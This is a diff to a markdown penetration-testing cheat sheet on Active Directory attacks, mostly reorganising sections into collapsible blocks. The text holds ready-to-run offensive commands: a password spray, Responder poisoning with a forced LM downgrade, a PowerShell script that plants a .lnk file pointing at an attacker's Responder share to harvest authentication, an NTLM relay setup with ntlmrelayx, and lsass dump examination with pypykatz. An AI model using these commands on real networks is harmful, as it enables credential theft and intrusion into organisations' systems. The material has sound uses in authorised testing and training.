@@ -130,8 +130,7 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
 
 # Acitve directory enumeration
 <details>
-  <summary> NMAP </summary> 
-  ## linWinPwn 
+  <summary> linWinPwn </summary> 
   ### Unauthenticated
   - Module ad_enum
       - RID bruteforce using crackmapexec
@@ -199,76 +198,73 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
 sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> or <hash_LM:NT]> or <kerbticket[./krb5cc_ticket]> -o <output_dir>
 ```
 
-## Dump for Bloodhuound
-```bash
-./bloodhound.py -c All -u <AD_user> -p <AD_password> -dc  <FQDN_AD_domain_name> -d  <AD_domain_name> -ns <DNS_IP>
-```
-
 ## Password spray
 ### Spray a password on a user list
 ```bash
 
 crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
 ```
+# Poisining 
+<details>
+  <summary> Responder </summary> 
+  ### Kickstart responder
+  ```bash
+  responder -I eth0
+  ```
 
-## Responder
-### Kickstart responder
-```bash
-responder -I eth0
-```
+  ### Force lm downgrade
+  ```bash
+  responder -I eth0 --lm
+  ```
 
-### Force lm downgrade
-```bash
-responder -I eth0 --lm
-```
+  ### Responder LNK ifle
 
-### Responder LNK ifle
+  #### In Powershell, use each command to create a linkfile for Responder
+  ```powershell
+  $objShell = New-Object -ComObject WScript.Shell
+  $lnk = $objShell.CreateShortcut("C:\Users\<User>\Desktop\<name>.lnk")
+  $lnk.TargetPath = "\\<ResponderIP>\@threat.png"
+  $lnk.WindowStyle = 1
+  $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+  $lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
+  $lnk.HotKey = "Ctrl+Alt+O"
+  $lnk.Save()
+  ```
 
-#### In Powershell, use each command to create a linkfile for Responder
-```powershell
-$objShell = New-Object -ComObject WScript.Shell
-$lnk = $objShell.CreateShortcut("C:\Users\<User>\Desktop\<name>.lnk")
-$lnk.TargetPath = "\\<ResponderIP>\@threat.png"
-$lnk.WindowStyle = 1
-$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
-$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
-$lnk.HotKey = "Ctrl+Alt+O"
-$lnk.Save()
-```
+  ### Crackmapexec NTLM-relay
+  #### Evaluate no smb-signing and create an IP txt file for TLMRelayx
+  ```bash
+  crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
+  ```
 
-### Crackmapexec NTLM-relay
-#### Evaluate no smb-signing and create an IP txt file for TLMRelayx
-```bash
-crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
-```
+  #### NTLMRelayx
+  ```bash
+  sudo python3 ntlmrelayx.py -smb2support -tf <outputIPs.txt>
+  ```
 
-#### NTLMRelayx
-```bash
-sudo python3 ntlmrelayx.py -smb2support -tf <outputIPs.txt>
-```
+  #### Disbale SMB and HTTP in Responder.conf
+  ```bash
+  [Responder Core]
 
-#### Disbale SMB and HTTP in Responder.conf
-```bash
-[Responder Core]
-
-; Servers to start
-SQL = On
-SMB = Off
-RDP = On
-Kerberos = On
-FTP = On
-POP = On
-SMTP = On
-IMAP = On
-HTTP = Off
-HTTPS = On
-DNS = On
-LDAP = On
-DCERPC = On
-WINRM = On
-SNMP = Off
-```
-
+  ; Servers to start
+  SQL = On
+  SMB = Off
+  RDP = On
+  Kerberos = On
+  FTP = On
+  POP = On
+  SMTP = On
+  IMAP = On
+  HTTP = Off
+  HTTPS = On
+  DNS = On
+  LDAP = On
+  DCERPC = On
+  WINRM = On
+  SNMP = Off
+  ```
+</details>
+  
 ## pypykatz
 ### Examine lsass dump
 ```bash
